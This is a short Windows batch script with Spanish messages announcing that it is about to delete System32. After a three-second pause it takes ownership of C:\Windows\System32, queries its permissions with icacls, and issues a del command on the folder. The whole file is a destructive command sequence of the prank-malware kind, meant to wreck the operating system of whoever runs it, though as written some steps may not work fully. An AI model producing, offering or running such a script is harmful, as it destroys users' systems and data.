TITLE Eliminando System32...
echo Estas apunto de eliminar el System32
echo Empezando ah eliminar...
SLEEP 3

takeown /f C:\Windows\System32
icacls C:\Windows\System32
del c:\\windows\system32
